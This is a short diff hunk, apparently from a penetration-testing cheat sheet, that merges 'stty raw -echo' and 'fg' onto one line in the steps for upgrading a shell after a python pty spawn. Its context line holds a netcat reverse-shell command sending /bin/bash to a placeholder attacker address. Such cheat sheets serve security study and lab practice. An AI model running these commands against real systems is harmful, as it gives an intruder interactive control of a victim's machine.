@@ -380,8 +380,7 @@ nc -nv IP_Attacker Port -e /bin/bash
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 CTRL+Z
-stty raw -echo
-fg
+stty raw -echo; fg
 <ENTER>
 <ENTER>
 ```
